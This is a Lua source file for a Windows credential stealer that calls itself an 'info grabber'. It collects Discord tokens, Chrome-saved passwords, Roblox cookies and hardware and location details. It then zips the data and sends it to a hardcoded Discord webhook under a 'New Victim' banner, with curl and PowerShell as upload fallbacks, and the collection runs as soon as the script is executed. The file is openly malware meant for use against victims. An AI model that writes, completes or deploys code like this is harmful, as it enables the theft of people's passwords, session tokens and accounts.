--[[
    LUA version of info grabber - does NOT require luarocks or any preinstalled libs.
    Uses os.execute, os.getenv, io, and socket/http if available.
    All exfil via HTTP POST using Windows powershell/webclient fallback if not possible in pure Lua.
    Discord tokens/passwords/roblox cookies are EXTRACTED BUT NOT DECRYPTED from relevant LevelDB/SQL/JSON files.
    Social login grouping, hardware info collecting, and ZIP uses powershell fallback.
--]]

WEBHOOK_URL = "https://discord.com/api/webhooks/1495247089800843364/vqsAe2jXiLCBm6M0rJs-WpHLONsDBTZn7O4LVgUUID3Lc8QO8Q3lzP7mybP_1XU8oGoj"

SOCIAL_MEDIA_DOMAINS = {
    "discord.com", "discordapp.com", "twitter.com", "instagram.com", "facebook.com",
    "tiktok.com", "snapchat.com", "vk.com", "youtube.com", "gmail.com", "google.com",
    "outlook.com", "live.com", "yahoo.com", "hotmail.com", "messenger.com", "github.com",
    "linkedin.com", "skype.com", "telegram.org", "reddit.com", "pinterest.com", "tumblr.com"
}

function file_exists(name)
    local f = io.open(name, "rb")
    if f then f:close() return true else return false end
end

function dir_exists(path)
    local ok, err, code = os.rename(path, path)
    if not ok then
        if code == 13 then return true end
    end
    return ok
end

function get_mac_address()
    local mac = "NotFound"
    local f = io.popen("getmac")
    if f then
        local output = f:read("*a")
        f:close()
        mac = string.match(output, "([0-9A-Fa-f][0-9A-Fa-f][%-:]){5}[0-9A-Fa-f][0-9A-Fa-f]")
        if mac == nil then mac = "NotFound" end
    end
    return mac
end

function get_hwid()
    local f = io.popen('wmic csproduct get uuid')
    if f then
        local out = f:read("*a")
        f:close()
        local uuid = string.match(out or "", "%x%-%x%-%x%-%x%-%x+")
        if not uuid or uuid == "" then
            uuid = (out:match("UUID%s+([%w-]+)") or "Unknown")
        end
        return uuid or "Unknown"
    end
    return "Unknown"
end

function splitlines(str)
    local t = {}
    for line in string.gmatch(str, "[^\r\n]+") do
        table.insert(t, line)
    end
    return t
end

function download_url(url)
    -- Use LuaSocket if available, else fallback to curl or powershell
    local ok, http = pcall(require, "socket.http")
    if ok and http then
        local body, code = http.request(url)
        return body
    else
        -- fallback curl or PowerShell
        local tempfile = os.getenv("TEMP") .. "\\_luadownload.tmp"
        os.execute('curl -sL -o "' .. tempfile .. '" "' .. url .. '" >nul 2>&1')
        local f = io.open(tempfile, "rb")
        local d = ""
        if f then d = f:read("*a") f:close() end
        os.remove(tempfile)
        if d and d ~= "" then return d end
        -- Last resort: PowerShell
        os.execute('powershell -command "& {Invoke-WebRequest \''..url..'\' -OutFile \''..tempfile..'\'}"')
        local f2 = io.open(tempfile, "rb")
        if f2 then d = f2:read("*a") f2:close() end
        os.remove(tempfile)
        return d
    end
end

function get_ipinfo()
    local ip = download_url("https://api64.ipify.org") or "Unknown"
    ip = (ip or ""):gsub("%s+", "")
    local country, city = "Unknown", "Unknown"
    if ip ~= "Unknown" and ip ~= "" then
        country = download_url("https://ipapi.co/"..ip.."/country_name") or "Unknown"
        city = download_url("https://ipapi.co/"..ip.."/city") or "Unknown"
        country = (country or ""):gsub("%s+$","")
        city = (city or ""):gsub("%s+$","")
    end
    return ip, country, city
end

function get_appdata_path()
    local appdata = os.getenv('APPDATA') or (os.getenv("USERPROFILE") and (os.getenv("USERPROFILE") .. "\\AppData\\Roaming")) or "C:\\Users\\Default\\AppData\\Roaming"
    return appdata
end

function get_local_path()
    local userprofile = os.getenv("USERPROFILE") or "C:\\Users\\Default"
    return userprofile .. "\\AppData\\Local"
end

function find_discord_tokens()
    local tokens = {}
    local appdata = get_appdata_path()
    local paths = {
        appdata .. "\\Discord",
        appdata .. "\\discordcanary",
        appdata .. "\\discordptb",
        appdata .. "\\Lightcord"
    }
    local token_pat = "dQw4w9WgXcQ:([^\"]+)"
    for _, base in ipairs(paths) do
        local ldb_dir = base .. "\\Local Storage\\leveldb"
        if dir_exists(ldb_dir) then
            local p = io.popen('dir /b "'..ldb_dir..'"')
            if p then
                for fname in p:lines() do
                    if fname:match("%.ldb$") or fname:match("%.log$") then
                        local f = io.open(ldb_dir.."\\"..fname,"r")
                        if f then
                            for line in f:lines() do
                                for match in line:gmatch(token_pat) do
                                    -- Only base64, cannot decrypt
                                    table.insert(tokens, "dQw4w9WgXcQ:"..match)
                                end
                            end
                            f:close()
                        end
                    end
                end
                p:close()
            end
        end
    end
    -- Remove dupes
    local cleaned = {}
    local dedup = {}
    for _, t in ipairs(tokens) do
        t = t:gsub("\\","")
        if t ~= "" and not dedup[t] then
            table.insert(cleaned, t)
            dedup[t] = true
        end
    end
    return cleaned
end

function string_starts(str, substr)
    return string.sub(str, 1, #substr) == substr
end

function table_contains(tab, needle)
    for _, v in ipairs(tab) do
        if v == needle then return true end
    end
    return false
end

function is_social_media(domain)
    for _, social in ipairs(SOCIAL_MEDIA_DOMAINS) do
        if domain:lower():find(social:lower(), 1, true) then
            return true
        end
    end
    return false
end

function get_chrome_passwords(tmpdir)
    -- Only works for default user and only for Chrome, does not decrypt!
    local passwords, website_login_data, social_media_logins = {}, {}, {}
    local chrome_login_db = get_local_path().."\\Google\\Chrome\\User Data\\Default\\Login Data"
    if not file_exists(chrome_login_db) then
        return passwords, website_login_data, social_media_logins
    end
    -- Copy to temp for reading
    local cpyfile = tmpdir.."\\chrome_LoginData.txt"
    local src = io.open(chrome_login_db, "rb")
    local dst = io.open(cpyfile, "wb")
    if src and dst then
        dst:write(src:read("*a"))
        src:close() dst:close()
    end
    -- This is just a binary Chrome SQLite DB; do a text search for logins
    src = io.open(cpyfile,"rb")
    if src then
        local dbdata = src:read("*a")
        src:close()
        -- try heuristics: look for "https://" then some ASCII, then the username, password, etc
        for url, username, pwd in dbdata:gmatch("(%a+://[%w%p]+)%z([^%z]*)%z([^\0]*)%z") do
            if username ~= "" or pwd ~= "" then
                table.insert(passwords, {username, pwd, url})
                local domain = url:gsub("^https?://(www%.)?", ""):match("^[^/]+") or ""
                if domain ~= "" then
                    if is_social_media(domain) then
                        social_media_logins[domain] = social_media_logins[domain] or {}
                        table.insert(social_media_logins[domain], {username=username, password=pwd, url=url})
                    else
                        website_login_data[domain] = website_login_data[domain] or {}
                        table.insert(website_login_data[domain], {username=username, password=pwd, url=url})
                    end
                end
            end
        end
    end
    return passwords, website_login_data, social_media_logins
end

function find_roblox_tokens()
    -- Only runs if Roblox executables are running (weak detection: ignore for now)
    local roblox_cookies = {}
    local localp = get_local_path()
    local cookies_paths = {
        localp.."\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
        localp.."\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
    }
    for _, cookie_db in ipairs(cookies_paths) do
        if file_exists(cookie_db) then
            local db = io.open(cookie_db,"rb")
            if db then
                local data = db:read("*a")
                db:close()
                -- Look for ".ROBLOSECURITY" nearby roblox.com in the binary blob (does not decrypt, just extract)
                for host, name, path, enc_val in data:gmatch("roblox%.com%z([^\0]*)%z([^\0]*)%z([^\0]*)") do
                    roblox_cookies[host] = roblox_cookies[host] or {}
                    table.insert(roblox_cookies[host], {name=name, path=path, value="CANNOT_DECRYPT"})
                end
            end
        end
    end
    return roblox_cookies
end

function format_website_logins(logins)
    local out, n = {}, 1
    for _, entry in ipairs(logins) do
        table.insert(out, string.format("--- Login #%d ---", n))
        table.insert(out, "URL          : "..(entry.url or ""))
        table.insert(out, "Username/Email: "..(entry.username or ""))
        table.insert(out, "Password     : "..(entry.password or ""))
        table.insert(out, "")
        n = n + 1
    end
    return table.concat(out, "\n")
end

function format_roblox_cookies(roblox_cookies)
    local out = {}
    for domain, cookies in pairs(roblox_cookies) do
        table.insert(out, "== "..domain.." ==")
        for _, c in ipairs(cookies) do
            table.insert(out, "Cookie Name: "..(c.name or ""))
            table.insert(out, "  Path: "..(c.path or ""))
            table.insert(out, "  Value: "..(c.value or ""))
            table.insert(out, "")
        end
        table.insert(out, "")
    end
    return table.concat(out, "\n")
end

function table_print(rows, header)
    if #rows == 0 then return "" end
    local colw = {}
    local function len(v)
        return #(tostring(v or ""))
    end
    for i, head in ipairs(header) do colw[i] = len(head) end
    for _, row in ipairs(rows) do
        for i, cell in ipairs(row) do
            if len(cell) > colw[i] then colw[i] = len(cell) end
        end
    end
    local function pad(str,width)
        str=tostring(str or ""); return str..string.rep(" ",width-#str) end
    end
    local lines = {}
    table.insert(lines, "| "..table.concat((function()
        local r={}; for i,cell in ipairs(header) do table.insert(r, pad(cell, colw[i])) end; return r end)(), " | ").." |")
    table.insert(lines, "| "..table.concat((function()
        local r={}; for i=1,#colw do table.insert(r, string.rep("-", colw[i])) end; return r end)(), " | ").." |")
    for _, row in ipairs(rows) do
        table.insert(lines, "| "..table.concat((function()
            local r={}; for i,cell in ipairs(row) do table.insert(r, pad(cell, colw[i])) end; return r end)(), " | ").." |")
    end
    return table.concat(lines, "\n")
end

function create_tempdir()
    -- Use TEMP or USERPROFILE, try up to 100 times
    local try = 1
    local base = os.getenv("TEMP") or os.getenv("TMP") or os.getenv("USERPROFILE") or "."
    while try<100 do
        local td = base.."\\lgrb_"..tostring(math.random(10000,99999))
        if not dir_exists(td) then
            os.execute('mkdir "'..td..'" >nul 2>&1')
            return td
        end
        try = try + 1
    end
    return base
end

function zip_dir(dir, zip_path)
    -- Try using powershell for Zip
    local cmd = 'powershell -Command "Compress-Archive -Path \''..dir..'\\*\' -DestinationPath \''..zip_path..'\'"'
    os.execute(cmd)
    return file_exists(zip_path)
end

function send_webhook(content, filepath, filename)
    -- Try pure-lua HTTP POST, else fallback to curl, else to PowerShell
    local boundary = '----WebKitFormBoundary'..tostring(math.random(10000000,99999999))
    local body = ""
    body = body .. "--"..boundary.."\r\n"
    body = body .. ('Content-Disposition: form-data; name="content"\r\n\r\n'..content.."\r\n")
    if filepath and file_exists(filepath) then
        local f = io.open(filepath, "rb")
        local filedata = f:read("*a")
        f:close()
        body = body.."--"..boundary.."\r\n"
        body = body.."Content-Disposition: form-data; name=\"file\"; filename=\""..filename.."\"\r\n"
        body = body.."Content-Type: application/zip\r\n\r\n"
        body = body..filedata.."\r\n"
    end
    body = body.."--"..boundary.."--\r\n"
    local ok, httpsock = pcall(require, "socket.http")
    if ok and httpsock then
        httpsock.request{
            url = WEBHOOK_URL,
            method = "POST",
            headers = {
                ["Content-Type"] = "multipart/form-data; boundary="..boundary,
                ["Content-Length"] = tostring(#body)
            },
            source = ltn12 and ltn12.source.string(body) or nil
        }
    elseif filepath and file_exists(filepath) then
        -- fallback curl
        os.execute('curl -F "file=@'..filepath..'" -F "content='..content..'" "'..WEBHOOK_URL..'" >nul 2>&1')
    else
        -- PowerShell
        local tempf = create_tempdir().."\\plainmsg.txt"
        local f = io.open(tempf,"w")
        f:write(content)
        f:close()
        os.execute('powershell -Command "$c=Get-Content -Raw \''..tempf..'\'; Invoke-WebRequest -Uri \''..WEBHOOK_URL..'\' -Method POST -Body @{content=$c}"')
        os.remove(tempf)
    end
end

function collect_and_send()
    math.randomseed(os.time())
    local ip, country, city = get_ipinfo()
    local mac = get_mac_address()
    local hwid = get_hwid()
    local discord_tokens = find_discord_tokens()
    local roblox_cookies = find_roblox_tokens()
    local td = create_tempdir()
    -- Save Discord tokens
    local disco_file = td.."\\discord_tokens.txt"
    local f = io.open(disco_file, "w")
    if #discord_tokens>0 then
        f:write(table.concat(discord_tokens, "\n"))
    else
        f:write("No Discord tokens found.")
    end
    f:close()
    -- Chrome passwords
    local chrome_pwds, website_login_data, social_media_logins = get_chrome_passwords(td)
    local chrome_file = td.."\\chrome_passwords.txt"
    local all_non_social = {}
    for domain, entries in pairs(website_login_data) do
        for _, entry in ipairs(entries) do
            table.insert(all_non_social, {entry.username, entry.password, entry.url})
        end
    end
    f = io.open(chrome_file, "w")
    f:write(table_print(all_non_social, {"Username/Email","Password","URL"}))
    f:close()
    -- Per social media
    for domain, logins in pairs(social_media_logins) do
        local domsan = domain:gsub("[:/\\]", "_")
        local fname = td.."\\"..domsan.."_logins.txt"
        f = io.open(fname,"w")
        f:write(format_website_logins(logins))
        f:close()
    end
    -- Roblox session/cookies
    local roblox_file
    if next(roblox_cookies) then
        roblox_file = td.."\\roblox_cookies.txt"
        f = io.open(roblox_file,"w")
        f:write(format_roblox_cookies(roblox_cookies))
        f:close()
    end
    -- Zip files (fallback powershell)
    local zip_path = td.."\\data.zip"
    zip_dir(td, zip_path)
    -- Compose info
    local username = os.getenv("USERNAME") or "Unknown"
    local compname = os.getenv("COMPUTERNAME") or "Unknown"
    local social_media_sites = ""
    for k in pairs(social_media_logins) do
        social_media_sites = social_media_sites .. k .. ", "
    end
    if social_media_sites == "" then social_media_sites = "None" else social_media_sites = social_media_sites:sub(1,-3) end
    local content =
        "**New Victim**\n"..
        "**Username:** "..username.."\n"..
        "**Computer:** "..compname.."\n"..
        "**IP:** "..ip.."\n"..
        "**Country:** "..country.."\n"..
        "**City:** "..city.."\n"..
        "**MAC:** "..mac.."\n"..
        "**HWID:** "..hwid.."\n"..
        "**Discord Tokens Found:** "..tostring(#discord_tokens).."\n"..
        "**Passwords Grabbed:** "..tostring(#chrome_pwds).."\n"..
        "**Website Logins (non-social):** "..tostring(#all_non_social).."\n"..
        "**Social Media Sites:** "..social_media_sites.."\n"..
        "**Roblox Cookies Found:** "..(next(roblox_cookies) and "Yes" or "No")
    -- Send info
    send_webhook(content)
    if file_exists(zip_path) then
        send_webhook("Dumped Data", zip_path, "data_"..username..".zip")
    end
    -- Clean up
    --os.execute('rmdir /s /q "'..td..'"')
end

collect_and_send()
